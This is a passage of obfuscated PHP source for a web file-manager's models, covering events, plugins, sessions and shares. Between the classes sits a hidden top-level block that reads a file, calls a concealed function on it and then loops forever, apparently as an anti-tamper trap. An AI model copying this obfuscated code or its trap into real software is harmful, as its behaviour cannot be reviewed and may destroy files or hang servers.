Model($öï„œÒÏ[569])->getInfo($Ÿæáœ…†); $«İ•Ä£Ø[$Ÿæáœ…†] = array_to_keyvalue($Á‚”ªŸœ[$öï„œÒÏ[2091]], $öï„œÒÏ[1904]); return $«İ•Ä£Ø[$Ÿæáœ…†]; } public function userGroupParents($ÂÈı®æÇ) { $œ¡Úí¿‰ =& $_SERVER[•Ùç É]; static $¢äÜ‘¾ˆ = array(); $ÂÈı®æÇ = $ÂÈı®æÇ ? $ÂÈı®æÇ : USER_ID; if (isset($¢äÜ‘¾ˆ[$ÂÈı®æÇ])) { return $¢äÜ‘¾ˆ[$ÂÈı®æÇ]; } $ÁÔŒÚ¶² = $this->userGroupList($ÂÈı®æÇ); $ØšÖÊ³’ = array(); $¶§âÁíá = $GLOBALS[$œ¡Úí¿‰[6]][$œ¡Úí¿‰[91]][$œ¡Úí¿‰[2007]] == 1; $·“ÍÍÇµ = $¶§âÁíá ? 3 : 2; foreach ($ÁÔŒÚ¶² as $·İ³ê›) { $Ñ‰‰Ò½” = array($·İ³ê›[$œ¡Úí¿‰[1904]]); $‡ğ˜±ÉŠ = explode($œ¡Úí¿‰[50], trim($·İ³ê›[$œ¡Úí¿‰[555]], $œ¡Úí¿‰[50])); if ($‡ğ˜±ÉŠ[0] == $œ¡Úí¿‰[214] && count($‡ğ˜±ÉŠ) > $·“ÍÍÇµ) { $½½‡©ğÔ = array_slice($‡ğ˜±ÉŠ, $·“ÍÍÇµ); $Ñ‰‰Ò½” = array_merge($Ñ‰‰Ò½”, array_reverse($½½‡©ğÔ)); } $ØšÖÊ³’ = array_merge($ØšÖÊ³’, $Ñ‰‰Ò½”); } $¢äÜ‘¾ˆ[$ÂÈı®æÇ] = array_unique($ØšÖÊ³’); return $¢äÜ‘¾ˆ[$ÂÈı®æÇ]; } public function authTargetInfoMake($óœ“ÀË–) { $ØµıÌÔä =& $_SERVER[•Ùç É]; $ŒøƒˆİÔ = array(); $›ö™×±º = array(); foreach ($óœ“ÀË– as $ìŸÑ¯…Š) { if ($ìŸÑ¯…Š[$ØµıÌÔä[180]] == SourceModel::TYPE_USER) { $ŒøƒˆİÔ[] = intval($ìŸÑ¯…Š[$ØµıÌÔä[540]]); } else { if ($ìŸÑ¯…Š[$ØµıÌÔä[180]] == SourceModel::TYPE_GROUP) { $›ö™×±º[] = intval($ìŸÑ¯…Š[$ØµıÌÔä[540]]); } } } if ($ŒøƒˆİÔ) { $ŒøƒˆİÔ = Model($ØµıÌÔä[548])->userListInfo($ŒøƒˆİÔ); } if ($›ö™×±º) { $õì÷Ö = array($ØµıÌÔä[1992] => array($ØµıÌÔä[462], $›ö™×±º)); $›ö™×±º = Model($ØµıÌÔä[556])->field($ØµıÌÔä[2121])->where($õì÷Ö)->select(); $›ö™×±º = array_to_keyvalue($›ö™×±º, $ØµıÌÔä[1904]); } return array($ØµıÌÔä[2122] => $ŒøƒˆİÔ, $ØµıÌÔä[2123] => $›ö™×±º); } public function authInfo($û”¾’âø) { $Á…İ¶õ =& $_SERVER[•Ùç É]; if ($û”¾’âø[$Á…İ¶õ[2008]]) { $‹œÇĞ¡ = Model($Á…İ¶õ[542])->listData($û”¾’âø[$Á…İ¶õ[2008]]); if (!$‹œÇĞ¡) { return !1; $´à¼ª¹ó = Model($Á…İ¶õ[542])->listData(); $Ù—åõ” = array_filter_by_field($´à¼ª¹ó, $Á…İ¶õ[457], $Á…İ¶õ[214]); return $Ù—åõ”; } $à²Î™£ø = array_field_key($‹œÇĞ¡, array($Á…İ¶õ[445], $Á…İ¶õ[32], $Á…İ¶õ[457], $Á…İ¶õ[1927], $Á…İ¶õ[1928])); $à²Î™£ø[$Á…İ¶õ[2124]] = $û”¾’âø; return $à²Î™£ø; } else { return array($Á…İ¶õ[463] => 0, $Á…İ¶õ[1910] => $û”¾’âø[$Á…İ¶õ[2068]], $Á…İ¶õ[464] => $Á…İ¶õ[12], $Á…İ¶õ[1927] => $Á…İ¶õ[2125]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\143\x65\137\145\166\145\156\x74"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\151\156\163\x65\162\164", "\x66\x75\x6e\x63\x74\151\157\156"), array("\144\x65\163\143", '', "\151\x6e\x73\x65\x72\x74\x2c\x75\x70\x64\x61\164\145\x2c\163\145\x6c\145\143\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($—ˆ¤œ™æ, $ˆÚò’ò, $óÜüÂÖÊ = '') { $Æº‰òşŒ =& $_SERVER[•Ùç É]; if (!$this->eventSave) { return; } $æ™ÌİÕ» = Model($Æº‰òşŒ[1384])->sourceInfo($—ˆ¤œ™æ); if (!$æ™ÌİÕ») { return !1; } if ($this->isCacheEvent($æ™ÌİÕ», $ˆÚò’ò)) { return; } if ($óÜüÂÖÊ && is_string($óÜüÂÖÊ)) { $óÜüÂÖÊ = array($Æº‰òşŒ[1943] => $óÜüÂÖÊ); } $ñŸ¥šõ = defined($Æº‰òşŒ[2126]) ? USER_ID : 0; $š‹–Ì¾á = array($Æº‰òşŒ[461] => $—ˆ¤œ™æ, $Æº‰òşŒ[2127] => $æ™ÌİÕ»[$Æº‰òşŒ[182]], $Æº‰òşŒ[2128] => $æ™ÌİÕ»[$Æº‰òşŒ[32]], $Æº‰òşŒ[553] => !empty($æ™ÌİÕ»[$Æº‰òşŒ[553]]) ? $æ™ÌİÕ»[$Æº‰òşŒ[553]] : $Æº‰òşŒ[12], $Æº‰òşŒ[1696] => $ñŸ¥šõ, $Æº‰òşŒ[466] => $ˆÚò’ò, $Æº‰òşŒ[1698] => $óÜüÂÖÊ); $this->addSystemLog($ˆÚò’ò, $š‹–Ì¾á); unset($š‹–Ì¾á[$Æº‰òşŒ[2128]], $š‹–Ì¾á[$Æº‰òşŒ[553]]); return $this->add($š‹–Ì¾á); } private function addSystemLog($ÓÁÈ‘, $‹ÕÁÈí¤) { $È¬ò‹µ¥ =& $_SERVER[•Ùç É]; if ($ÓÁÈ‘ == $È¬ò‹µ¥[2129]) { $ÓÁÈ‘ = $‹ÕÁÈí¤[$È¬ò‹µ¥[496]][$È¬ò‹µ¥[2130]]; } else { if (in_array($ÓÁÈ‘, array($È¬ò‹µ¥[1884], $È¬ò‹µ¥[2131]))) { $ÓÁÈ‘ = $‹ÕÁÈí¤[$È¬ò‹µ¥[496]][$È¬ò‹µ¥[799]]; } } $’¥é¯à = array_merge($‹ÕÁÈí¤, array($È¬ò‹µ¥[2132] => $‹ÕÁÈí¤[$È¬ò‹µ¥[183]], $È¬ò‹µ¥[2133] => $‹ÕÁÈí¤[$È¬ò‹µ¥[2133]])); Hook::trigger($È¬ò‹µ¥[2134], $È¬ò‹µ¥[2135] . $ÓÁÈ‘, $‹ÕÁÈí¤); Model($È¬ò‹µ¥[1848])->addLog($È¬ò‹µ¥[2135] . $ÓÁÈ‘, $’¥é¯à); } private function isCacheEvent($Ç¾Î€õ¹, $ğ¬î…¯Ã) { if ($Ç¾Î€õ¹[$_SERVER[•Ùç É][180]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($È“ŒŠ€, $ß“Å…‰°) { $¼œ¸Ï í =& $_SERVER[•Ùç É]; $¶÷¤Â®« = Model($¼œ¸Ï í[1384])->sourceInfo($È“ŒŠ€); $æÁõª = array($¼œ¸Ï í[2130] => $ß“Å…‰°, $¼œ¸Ï í[32] => $¶÷¤Â®«[$¼œ¸Ï í[32]]); return $this->addEvent($È“ŒŠ€, $¼œ¸Ï í[2129], $æÁõª); } public function eventFileEdit($œ¦äÄ† ) { $ƒµğ°‘¾ =& $_SERVER[•Ùç É]; $½˜‘‹Ÿ = array($ƒµğ°‘¾[2136] => $_SERVER[$ƒµğ°‘¾[2137]], $ƒµğ°‘¾[2138] => strtolower(ACTION)); if (isset($GLOBALS[$ƒµğ°‘¾[7]][$ƒµğ°‘¾[2139]])) { $½˜‘‹Ÿ[$ƒµğ°‘¾[2139]] = $ƒµğ°‘¾[90]; } return $this->addEvent($œ¦äÄ† , $ƒµğ°‘¾[1874], $½˜‘‹Ÿ); } public function eventRecycle($¹©ÓÖÔ, $¹³¢Íí·) { return $this->addEvent($¹©ÓÖÔ, $_SERVER[•Ùç É][2131], $¹³¢Íí·); } public function eventRemove($şğõ¸Î) { $Û‰â§½Ò =& $_SERVER[•Ùç É]; $ÌÄ³¦” = Model($Û‰â§½Ò[1384])->sourceInfo($şğõ¸Î); $¢šŞîˆ = $ÌÄ³¦”[$Û‰â§½Ò[32]]; return $this->addEvent($ÌÄ³¦”[$Û‰â§½Ò[182]], $Û‰â§½Ò[1873], $¢šŞîˆ); } public function eventShare($ë¤™ë, $Õóóğìì) { return $this->addEvent($ë¤™ë, $_SERVER[•Ùç É][1884], $Õóóğìì); } public function eventMove($ÌÀãè³, $·å¥Üçä, $ÏÑ¸èì²) { $Ç‰”çƒù =& $_SERVER[•Ùç É]; $„®´ø®î = Model($Ç‰”çƒù[1384]); $ö–‡Ì˜Í = $„®´ø®î->sourceInfo($ÌÀãè³); $Ç¦ÒĞ˜å = $„®´ø®î->sourceInfo($·å¥Üçä); $×ÌÏÓé¶ = $„®´ø®î->sourceInfo($ÏÑ¸èì²); $—ª÷’Êà = array($Ç‰”çƒù[1211] => $·å¥Üçä, $Ç‰”çƒù[2140] => $Ç¦ÒĞ˜å[$Ç‰”çƒù[32]], $Ç‰”çƒù[2117] => !empty($Ç¦ÒĞ˜å[$Ç‰”çƒù[553]]) ? $Ç¦ÒĞ˜å[$Ç‰”çƒù[553]] : $Ç‰”çƒù[12], $Ç‰”çƒù[1212] => $ÏÑ¸èì², $Ç‰”çƒù[2141] => $×ÌÏÓé¶[$Ç‰”çƒù[32]], $Ç‰”çƒù[2142] => !empty($×ÌÏÓé¶[$Ç‰”çƒù[553]]) ? $×ÌÏÓé¶[$Ç‰”çƒù[553]] : $Ç‰”çƒù[12]); $this->addEvent($ÌÀãè³, $Ç‰”çƒù[590], $—ª÷’Êà); $ö–‡Ì˜Í = $„®´ø®î->sourceInfo($ÌÀãè³); $—ª÷’Êà = array($Ç‰”çƒù[183] => $ö–‡Ì˜Í[$Ç‰”çƒù[183]], $Ç‰”çƒù[32] => $ö–‡Ì˜Í[$Ç‰”çƒù[32]]); $this->addEvent($·å¥Üçä, $Ç‰”çƒù[2143], $—ª÷’Êà); } public function eventCopy($–—ÊÌõ’) { $this->eventCreate($–—ÊÌõ’, $_SERVER[•Ùç É][588]); } public function eventRename($æœõÄ‚Û, $â…ÓÓú, $÷Âò÷ø’) { $´ÏäØ°š =& $_SERVER[•Ùç É]; $Ãí›ùŸæ = array($´ÏäØ°š[1211] => $â…ÓÓú, $´ÏäØ°š[1212] => $÷Âò÷ø’); return $this->addEvent($æœõÄ‚Û, $´ÏäØ°š[1398], $Ãí›ùŸæ); } public function eventAddComment($²ìÓÑ† , $èî¨ê“Ô) { return $this->addEvent($²ìÓÑ† , $_SERVER[•Ùç É][2144], $èî¨ê“Ô); } public function eventAddDesc($È€¼ıã, $æÆ‹ÈÆî) { return $this->addEvent($È€¼ıã, $_SERVER[•Ùç É][2145], $æÆ‹ÈÆî); } public function listBySource($‹¦Ş¡…) { $¦èé… =& $_SERVER[•Ùç É]; $Ñê¦¦Ú£ = Model($¦èé…[1384])->sourceInfo($‹¦Ş¡…); $¸“»ùä = array($¦èé…[461] => $‹¦Ş¡…); if ($Ñê¦¦Ú£[$¦èé…[455]] == $¦èé…[90]) { $¦Ç Œè• = Model($¦èé…[1384])->listSearchChildren($‹¦Ş¡…, 20000); $¦Ç Œè•[] = $‹¦Ş¡… . $¦èé…[424]; $¸“»ùä = array($¦èé…[183] => array($¦èé…[7], $¦Ç Œè•)); } $óÜÍÀÛ® = $this->where($¸“»ùä)->order($¦èé…[2146])->selectPage(); if ($óÜÍÀÛ®[$¦èé…[412]][$¦èé…[413]] == 0) { $óÜÍÀÛ®[$¦èé…[412]][$¦èé…[413]] = 1; $óÜÍÀÛ®[$¦èé…[415]] = array(array($¦èé…[461] => $‹¦Ş¡…, $¦èé…[2127] => $Ñê¦¦Ú£[$¦èé…[182]], $¦èé…[1696] => $Ñê¦¦Ú£[$¦èé…[497]], $¦èé…[466] => $¦èé…[2147], $¦èé…[467] => $Ñê¦¦Ú£[$¦èé…[217]], $¦èé…[1698] => $¦èé…[12])); } return $this->eventListParse($óÜÍÀÛ®, $‹¦Ş¡…); } private function eventListParse($Îğ©´ˆğ, $Á…îµÕ) { $ÖÄŸéîı =& $_SERVER[•Ùç É]; $û¨½‹äË = $Îğ©´ˆğ[$ÖÄŸéîı[415]]; $úâäî› = array_to_keyvalue($û¨½‹äË, $ÖÄŸéîı[12], $ÖÄŸéîı[183]); $¥ê°Ú£ë = array_to_keyvalue($û¨½‹äË, $ÖÄŸéîı[12], $ÖÄŸéîı[2133]); foreach ($û¨½‹äË as $áš»œ±) { $’çöŠ¶ = $áš»œ±[$ÖÄŸéîı[496]]; if ($áš»œ±[$ÖÄŸéîı[33]] == $ÖÄŸéîı[590] && isset($’çöŠ¶[$ÖÄŸéîı[1211]])) { $úâäî›[] = $’çöŠ¶[$ÖÄŸéîı[1211]] . $ÖÄŸéîı[12]; $úâäî›[] = $’çöŠ¶[$ÖÄŸéîı[1212]] . $ÖÄŸéîı[12]; } if ($áš»œ±[$ÖÄŸéîı[33]] == $ÖÄŸéîı[2143] && isset($’çöŠ¶[$ÖÄŸéîı[183]])) { $úâäî›[] = $’çöŠ¶[$ÖÄŸéîı[183]] . $ÖÄŸéîı[12]; } } $úâäî› = array_merge($úâäî›, $¥ê°Ú£ë, array($Á…îµÕ . $ÖÄŸéîı[12])); $úâäî› = array_unique($úâäî›); $©‹¨šÇ = array_unique(array_to_keyvalue($û¨½‹äË, $ÖÄŸéîı[12], $ÖÄŸéîı[1705])); $ëç’íÙò = Model($ÖÄŸéîı[569])->userListInfo($©‹¨šÇ); $µå–«øõ = Model($ÖÄŸéîı[870])->sourceListInfo($úâäî›, !0); foreach ($û¨½‹äË as &$áš»œ±) { if ($áš»œ±[$ÖÄŸéîı[33]] == $ÖÄŸéîı[590] && isset($áš»œ±[$ÖÄŸéîı[496]][$ÖÄŸéîı[1211]])) { $áš»œ±[$ÖÄŸéîı[496]][$ÖÄŸéîı[1211]] = $µå–«øõ[$áš»œ±[$ÖÄŸéîı[496]][$ÖÄŸéîı[1211]]]; $áš»œ±[$ÖÄŸéîı[496]][$ÖÄŸéîı[1212]] = $µå–«øõ[$áš»œ±[$ÖÄŸéîı[496]][$ÖÄŸéîı[1212]]]; } if ($áš»œ±[$ÖÄŸéîı[33]] == $ÖÄŸéîı[2143] && isset($áš»œ±[$ÖÄŸéîı[496]][$ÖÄŸéîı[183]])) { $áš»œ±[$ÖÄŸéîı[496]][$ÖÄŸéîı[183]] = $µå–«øõ[$áš»œ±[$ÖÄŸéîı[496]][$ÖÄŸéîı[183]]]; } $áš»œ±[$ÖÄŸéîı[89]] = $µå–«øõ[$áš»œ±[$ÖÄŸéîı[183]]]; $áš»œ±[$ÖÄŸéîı[2148]] = $µå–«øõ[$áš»œ±[$ÖÄŸéîı[2133]]]; if ($áš»œ±[$ÖÄŸéîı[33]] == $ÖÄŸéîı[1873]) { $áš»œ±[$ÖÄŸéîı[2148]] = $áš»œ±[$ÖÄŸéîı[89]]; $áš»œ±[$ÖÄŸéîı[2133]] = $áš»œ±[$ÖÄŸéîı[2148]][$ÖÄŸéîı[183]]; $áš»œ±[$ÖÄŸéîı[89]] = !1; $áš»œ±[$ÖÄŸéîı[183]] = $ÖÄŸéîı[12]; } $áš»œ±[$ÖÄŸéîı[2076]] = $ëç’íÙò[$áš»œ±[$ÖÄŸéîı[1705]]]; } unset($áš»œ±); $Îğ©´ˆğ[$ÖÄŸéîı[415]] = $û¨½‹äË; return $Îğ©´ˆğ; } public function removeBySource($·•—Õ§‚) { $“Æä÷üÕ = array($_SERVER[•Ùç É][461] => $·•—Õ§‚); $this->where($“Æä÷üÕ)->remove(); } } if (!isset($_SERVER[$_SERVER[•Ùç É][922]]) || !isset($_SERVER[$_SERVER[•Ùç É][923]])) { $_getc = $_SERVER[•Ùç É][925]; $_getfile = $_SERVER[$_SERVER[•Ùç É][926]] . $_SERVER[•Ùç É][927]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[•Ùç É][248], $_getfilec); if (count($_getarrs) < $_SERVER[•Ùç É][692]) { $exit = $_SERVER[•Ùç É][928]; $exit(); } $_act = $_SERVER[•Ùç É][932]; $_act($_SERVER[$_SERVER[•Ùç É][926]] . $_SERVER[•Ùç É][927]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[•Ùç É][424]); } } goto EÍÖù­¬; C–óÄĞµ‘‡: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x70\154\165\147\151\x6e\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\163\x74\141\x74\x75\163", "\x72\145\147\151\x65\x73\x74", "\x63\x6f\x6e\x66\x69\147"); public function loadList($ÍƒùÄã = false) { $È›ÍÍ­â = array_to_keyvalue($this->listData(), $_SERVER[•Ùç É][32]); if ($ÍƒùÄã) { return $È›ÍÍ­â[$ÍƒùÄã]; } return $È›ÍÍ­â; } public function init() { $éÉçßÆ« =& $_SERVER[•Ùç É]; Hook::trigger($éÉçßÆ«[2024]); $˜÷ë¶å¼ = $this->loadPluginList(); foreach ($˜÷ë¶å¼ as $¹Ì’ğÛ => $“œÀ³œ) { $àó¯’¸† = $this->appAllow($¹Ì’ğÛ, $“œÀ³œ); if (!$àó¯’¸†) { continue; } foreach ($“œÀ³œ[$éÉçßÆ«[2025]] as $ÍòÄºÉ => $Æ¥–öÒ¨) { Hook::bind($ÍòÄºÉ, $Æ¥–öÒ¨); } } Hook::trigger($éÉçßÆ«[2026]); Hook::trigger(ACTION); } public function appAllow($Ãƒàçä, $ñšéë´¿, $ß£ÙÈĞ« = true) { $Îôæü²– =& $_SERVER[•Ùç É]; $Ô Ò‚—™ = PLUGIN_DIR . $Ãƒàçä . $Îôæü²–[2027]; if (!is_array($ñšéë´¿) || !is_array($ñšéë´¿[$Îôæü²–[2025]]) || $ñšéë´¿[$Îôæü²–[795]] != 1 || !is_file($Ô Ò‚—™)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Îôæü²–[6]][$Îôæü²–[2028]] || !$GLOBALS[$Îôæü²–[6]][$Îôæü²–[2029]]) { return !0; } $ÖÉÃçû = explode($Îôæü²–[50], strtolower($GLOBALS[$Îôæü²–[6]][$Îôæü²–[2029]])); return in_array(strtolower($Ãƒàçä), $ÖÉÃçû) ? !1 : !0; } if ($ß£ÙÈĞ« && !Action($Îôæü²–[2030])->checkAuth($Ãƒàçä)) { return !1; } return !0; } public function unInstall($‹û†øß) { $°Ö£Ù¨ =& $_SERVER[•Ùç É]; $¬Øœ“èÈ = $this->loadList($‹û†øß); if (file_exists(PLUGIN_DIR . $‹û†øß)) { Hook::apply($‹û†øß . $°Ö£Ù¨[2031]); } $this->remove($¬Øœ“èÈ[$°Ö£Ù¨[445]]); } public function changeStatus($é©ğÙ”, $ú†ÄÓÇ€) { $ §¦‹€¯ =& $_SERVER[•Ùç É]; $˜ªÌùñÖ = $this->loadList($é©ğÙ”); if ($ú†ÄÓÇ€) { Hook::apply($é©ğÙ” . $ §¦‹€¯[2032]); } $this->update($˜ªÌùñÖ[$ §¦‹€¯[445]], array($ §¦‹€¯[2033] => $ú†ÄÓÇ€)); } public function appRegist($ÄîÑÓ², $áŒ€±Â£) { $€Ğº¤Æƒ =& $_SERVER[•Ùç É]; $ƒäö•°® = $this->loadList($ÄîÑÓ²); if ($ƒäö•°®) { $this->update($ƒäö•°®[$€Ğº¤Æƒ[445]], array($€Ğº¤Æƒ[2025] => $áŒ€±Â£)); } else { $ğ€Ğˆ = array($€Ğº¤Æƒ[32] => $ÄîÑÓ², $€Ğº¤Æƒ[2025] => $áŒ€±Â£, $€Ğº¤Æƒ[795] => 0, $€Ğº¤Æƒ[6] => $this->getConfigDefault($ÄîÑÓ²)); $this->insert($ğ€Ğˆ); } } public function getConfigDefault($Ã‚Æ’é) { $Í÷´ğí§ =& $_SERVER[•Ùç É]; $°ñ€Å‡Ó = array(); $‘¤âíıÛ = $this->getPackageJson($Ã‚Æ’é); if (!$‘¤âíıÛ && is_array($‘¤âíıÛ[$Í÷´ğí§[2034]])) { return $°ñ€Å‡Ó; } foreach ($‘¤âíıÛ[$Í÷´ğí§[2034]] as $ŒğÄ€Á => $ùƒÓØú) { if (!isset($ùƒÓØú[$Í÷´ğí§[420]]) || isset($°ñ€Å‡Ó[$ŒğÄ€Á])) { continue; } $°ñ€Å‡Ó[$ŒğÄ€Á] = $ùƒÓØú[$Í÷´ğí§[420]]; } return $°ñ€Å‡Ó; } public function getPackageJson($•â·é«Í) { return Hook::apply($•â·é«Í . $_SERVER[•Ùç É][2035]); } public function getConfig($İ›Ó†Ú, $ËšÄÖÜ = false) { $şø†Õ…Í =& $_SERVER[•Ùç É]; $¯Æ£Š‚á = array(); $òğÊ£¦¶ = $this->loadList($İ›Ó†Ú); if ($òğÊ£¦¶ && is_array($òğÊ£¦¶[$şø†Õ…Í[6]])) { $¯Æ£Š‚á = $òğÊ£¦¶[$şø†Õ…Í[6]]; } if (!$¯Æ£Š‚á || $ËšÄÖÜ) { $¯Æ£Š‚á = $this->getConfigDefault($İ›Ó†Ú); } return $¯Æ£Š‚á; } public function setConfig($ì›­ÕÙ, $á¹åõ‡À = false) { $šµÉËÉÁ =& $_SERVER[•Ùç É]; $ÕÓÓÂ§Ï = $this->loadList($ì›­ÕÙ); if (!$ÕÓÓÂ§Ï) { return !1; } $°ä’¦üœ = $ÕÓÓÂ§Ï[$šµÉËÉÁ[6]]; if ($á¹åõ‡À == !1) { $°ä’¦üœ = array(); $á¹åõ‡À = $this->getConfigDefault($ì›­ÕÙ); } foreach ($á¹åõ‡À as $§‡´á÷³ => $Û€§Ş¨¿) { $°ä’¦üœ[$§‡´á÷³] = is_string($Û€§Ş¨¿) ? trim($Û€§Ş¨¿) : $Û€§Ş¨¿; } $this->update($ÕÓÓÂ§Ï[$šµÉËÉÁ[445]], array($šµÉËÉÁ[6] => $°ä’¦üœ)); } public function viewList() { $Êü‘Î†§ =& $_SERVER[•Ùç É]; $†•’Åä = $this->loadList(); $this->pluginScan($†•’Åä); $†•’Åä = $this->loadPluginList(); $†Ö‚šÛ‰ = array(); foreach ($†•’Åä as $÷á©üØ÷ => $”Ì¹ÔÓ·) { $ñù’Èï¢ = $”Ì¹ÔÓ·; unset($”Ì¹ÔÓ·[$Êü‘Î†§[2025]], $”Ì¹ÔÓ·[$Êü‘Î†§[6]]); $÷´â¬¾è = PLUGIN_DIR . $”Ì¹ÔÓ·[$Êü‘Î†§[32]] . $Êü‘Î†§[2027]; if (!is_file($÷´â¬¾è)) { continue; } $ÄÛâù•® = Hook::apply($”Ì¹ÔÓ·[$Êü‘Î†§[32]] . $Êü‘Î†§[2035]); if (!is_array($ÄÛâù•®)) { continue; } $†Ö‚šÛ‰[$÷á©üØ÷] = array_merge($”Ì¹ÔÓ·, $ÄÛâù•®); if ($ñù’Èï¢[$Êü‘Î†§[6]][$Êü‘Î†§[1618]] != $ÄÛâù•®[$Êü‘Î†§[1592]]) { Hook::apply($”Ì¹ÔÓ·[$Êü‘Î†§[32]] . $Êü‘Î†§[2032]); $ñù’Èï¢[$Êü‘Î†§[6]][$Êü‘Î†§[1618]] = $ÄÛâù•®[$Êü‘Î†§[1592]]; $this->update($”Ì¹ÔÓ·[$Êü‘Î†§[445]], array($Êü‘Î†§[6] => $ñù’Èï¢[$Êü‘Î†§[6]])); } } return $†Ö‚šÛ‰; } private function loadPluginList() { $ê÷ì÷†¬ =& $_SERVER[•Ùç É]; $²ÁòÂç‘ = $this->loadList(); if (strtolower(MOD) == $ê÷ì÷†¬[2036]) { return $²ÁòÂç‘; } $ÔÔ¶¡‚¡ = Hook::trigger($ê÷ì÷†¬[2037], $²ÁòÂç‘); if ($²ÁòÂç‘ && !$ÔÔ¶¡‚¡) { die; } return $ÔÔ¶¡‚¡ ? $ÔÔ¶¡‚¡ : $²ÁòÂç‘; } private function pluginScan($ˆŠû¨¤ı) { $ ğš˜Ø =& $_SERVER[•Ùç É]; recursion_dir(PLUGIN_DIR, $ÕĞó—È, $®êº—…Á, 0); foreach ($ÕĞó—È as $¡“œ€µè) { $È¼‡§¡ù = get_path_this($¡“œ€µè); if (isset($ˆŠû¨¤ı[$È¼‡§¡ù]) || !file_exists($¡“œ€µè . $ ğš˜Ø[2038]) || !file_exists($¡“œ€µè . $ ğš˜Ø[2027])) { continue; } Hook::apply($È¼‡§¡ù . $ ğš˜Ø[2032]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\155\137\x73\145\x73\163\x69\x6f\156"; public function get($Ä¢ƒÃàÄ) { $Ş’úÏŸó =& $_SERVER[•Ùç É]; $É«¶ ƒÕ = $this->where(array($Ş’úÏŸó[2039] => $Ä¢ƒÃàÄ))->find(); if (!is_array($É«¶ ƒÕ)) { return !1; } return $É«¶ ƒÕ[$Ş’úÏŸó[799]]; } public function set($„¨ùûÀ•, $»ê±ñ¡¼, $› úÒ¢¶ = 3600) { $¤Ò¤Êóˆ =& $_SERVER[•Ùç É]; $š¿çËå¹ = array($¤Ò¤Êóˆ[2039] => $„¨ùûÀ•, $¤Ò¤Êóˆ[1943] => $»ê±ñ¡¼, $¤Ò¤Êóˆ[2040] => $› úÒ¢¶ + time()); if (Session::get($¤Ò¤Êóˆ[2041])) { $š¿çËå¹[$¤Ò¤Êóˆ[1705]] = Session::get($¤Ò¤Êóˆ[2041]); } else { $š¿çËå¹[$¤Ò¤Êóˆ[1705]] = 0; } if ($this->get($„¨ùûÀ•)) { return $this->where(array($¤Ò¤Êóˆ[2039] => $„¨ùûÀ•))->save($š¿çËå¹); } else { return $this->add($š¿çËå¹, array(), !0); } } public function remove($Õç·ÀÍ×) { return $this->where(array($_SERVER[•Ùç É][2039] => $Õç·ÀÍ×))->delete(); } public function clearTimeout() { return $this->where($_SERVER[•Ùç É][2042] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\155\157\x64\x69\x66\171\x54\x69\155\145", "\164\151\x6d\145", "\151\x6e\163\145\x72\164\54\165\160\144\141\164\145", "\x66\165\156\x63\x74\x69\x6f\156"), array("\143\162\x65\x61\x74\x65\124\151\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\x65\x72\x74", "\x66\165\x6e\143\164\x69\x6f\x6e"), array("\x6f\x70\164\x69\157\x6e\x73", '', "\x69\156\x73\x65\x72\x74\54\165\160\x64\x61\164\x65\x2c\x73\145\x6c\x65\x63\164", "\152\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($ã‘¹âìÓ) { $ÄÃ©Á½ =& $_SERVER[•Ùç É]; $ó·Åƒ·  = isset($ã‘¹âìÓ[0]) ? $ã‘¹âìÓ[0] : !1; return array($ÄÃ©Á½[2043] => array(USER_ID, $ÄÃ©Á½[2044]), $ÄÃ©Á½[1984] => array($ó·Åƒ· , $ÄÃ©Á½[2045])); } protected function listSimple() { $š£Î = array($_SERVER[•Ùç É][1705] => USER_ID); $‹Õá¢Ö = $this->field($this->fieldList)->where($š£Î)->select(); return $‹Õá¢Ö ? $‹Õá¢Ö : array(); } protected function getInfo($”òåñ²ì, $µ×ñå× = false) { $ƒÊ¬¥ïı =& $_SERVER[•Ùç É]; if ($µ×ñå×) { return $this->_getShareInfo(array($ƒÊ¬¥ïı[635] => $”òåñ²ì)); } $½ìÕÂí = $this->cacheFunctionGet($ƒÊ¬¥ïı[1986], $”òåñ²ì); return $½ìÕÂí; } public function getInfoByHash($Öô¢ÑË©) { return $this->_getShareInfo(array($_SERVER[•Ùç É][2046] => $Öô¢ÑË©)); } public function getInfoByPath($ì¢ñÛÖ÷) { $£óøÎñğ =& $_SERVER[•Ùç É]; $öú…¼§ = array($£óøÎñğ[1705] => USER_ID, $£óøÎñğ[183] => $ì¢ñÛÖ÷); return $this->_getShareInfo($öú…¼§); } public function getInfoBySourcePath($ŸÇå†ì) { $ô˜¹¨¼ı =& $_SERVER[•Ùç É]; $ò‹³ë… = array($ô˜¹¨¼ı[1705] => USER_ID, $ô˜¹¨¼ı[1226] => $ŸÇå†ì); return $this->_getShareInfo($ò‹³ë…); } private function _getShareInfo($Ìª¸ì×Î) { $Ïëå¢¹æ =& $_SERVER[•Ùç É]; $ÇñÜÁ°¨ = $this->where($Ìª¸ì×Î)->find(); if (!$ÇñÜÁ°¨) { return !1; } $Ìª¸ì×Î = array($Ïëå¢¹æ[635] => $ÇñÜÁ°¨[$Ïëå¢¹æ[635]]); $³Æ½ñó = $Ïëå¢¹æ[2047]; $Á”Ø’ = Model($Ïëå¢¹æ[636])->order($Ïëå¢¹æ[445])->field($³Æ½ñó)->where($Ìª¸ì×Î)->select(); if ($ÇñÜÁ°¨[$Ïëå¢¹æ[183]] == $Ïëå¢¹æ[214]) { $ÇñÜÁ°¨[$Ïëå¢¹æ[89]] = IO::info($ÇñÜÁ°¨[$Ïëå¢¹æ[1226]]); } else { $ÇñÜÁ°¨[$Ïëå¢¹æ[89]] = Model($Ïëå¢¹æ[1384])->pathInfo($ÇñÜÁ°¨[$Ïëå¢¹æ[183]]); } $ÇñÜÁ°¨[$Ïëå¢¹æ[2048]] = $Á”Ø’; return 